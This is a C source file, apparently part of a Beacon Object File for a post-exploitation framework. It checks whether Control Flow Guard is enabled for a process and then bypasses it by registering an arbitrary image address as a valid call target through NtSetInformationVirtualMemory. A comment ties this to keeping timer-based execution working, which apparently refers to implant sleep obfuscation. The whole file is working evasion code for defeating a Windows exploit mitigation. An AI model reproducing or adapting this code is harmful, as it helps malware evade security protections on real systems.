#include <windows.h>

#define NT_SUCCESS(status) ( ( NTSTATUS ) ( status ) >= 0 )
#define NtCurrentProcess() ( ( HANDLE ) ( ULONG_PTR ) -1 )

typedef struct {
    ULONG ExtendedProcessInfo;
    ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION;

typedef enum {
    ProcessUserModeIOPL = 16,
    ProcessCookie = 36
} PROCESSINFOCLASS;

typedef struct {
    DWORD                 dwNumberOfOffsets;
    PULONG                plOutput;
    PCFG_CALL_TARGET_INFO ptOffsets;
    PVOID                 pMustBeZero;
    PVOID                 pMoarZero;
} VM_INFORMATION;

typedef enum {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct {
    PVOID  VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY;

typedef enum {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess     ( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory          ( HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T );
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory ( HANDLE, VIRTUAL_MEMORY_INFORMATION_CLASS, SIZE_T, MEMORY_RANGE_ENTRY *, PVOID, ULONG );

BOOL cfg_enabled ( )
{
    EXTENDED_PROCESS_INFORMATION proc_info = { 0 };

    NTSTATUS status = 0;

    proc_info.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    proc_info.ExtendedProcessInfoBuffer = 0;

    status = NTDLL$NtQueryInformationProcess ( NtCurrentProcess ( ), ProcessCookie | ProcessUserModeIOPL, &proc_info, sizeof ( proc_info ), NULL );

    if ( ! NT_SUCCESS ( status ) ) {
        return FALSE; 
    } 

    return proc_info.ExtendedProcessInfoBuffer;
}

BOOL bypass_cfg ( PVOID address )
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VM_INFORMATION           vmi = { 0 };
    MEMORY_RANGE_ENTRY       mre = { 0 };
    CFG_CALL_TARGET_INFO     cti = { 0 };

    NTSTATUS status = NTDLL$NtQueryVirtualMemory ( NtCurrentProcess ( ), address, MemoryBasicInformation, &mbi, sizeof ( mbi ), 0 );

    if ( ! NT_SUCCESS ( status ) ) {
        return FALSE;
    }

    if ( mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE ) {
        return FALSE;
    }

    cti.Offset = ( ULONG_PTR ) address - ( ULONG_PTR ) mbi.BaseAddress;
    cti.Flags  = CFG_CALL_TARGET_VALID;

    mre.NumberOfBytes  = ( SIZE_T ) mbi.RegionSize;
    mre.VirtualAddress = ( PVOID ) mbi.BaseAddress;

    ULONG output = 0;

    vmi.dwNumberOfOffsets = 0x1;
    vmi.plOutput          = &output;
    vmi.ptOffsets         = &cti;
    vmi.pMustBeZero       = 0x0;
    vmi.pMoarZero         = 0x0;

    status = NTDLL$NtSetInformationVirtualMemory ( NtCurrentProcess ( ), VmCfgCallTargetInformation, 1, &mre, ( PVOID ) &vmi, ( ULONG ) sizeof ( vmi ) );

    if ( status == 0xC00000F4 )
    {
        /* the size parameter is not valid. try 24 instead, which is a known size for older windows versions */
        status = NTDLL$NtSetInformationVirtualMemory ( NtCurrentProcess ( ), VmCfgCallTargetInformation, 1, &mre, ( PVOID ) &vmi, 24 );
    }

    if ( ! NT_SUCCESS ( status ) )
    {
        /* STATUS_INVALID_PAGE_PROTECTION - CFG wasn't enabled */ 
        if ( status == 0xC0000045 )
        {
            /* pretend we bypassed it so timers can continue */
            return TRUE;
        }

        return FALSE;
    }

    return TRUE;
}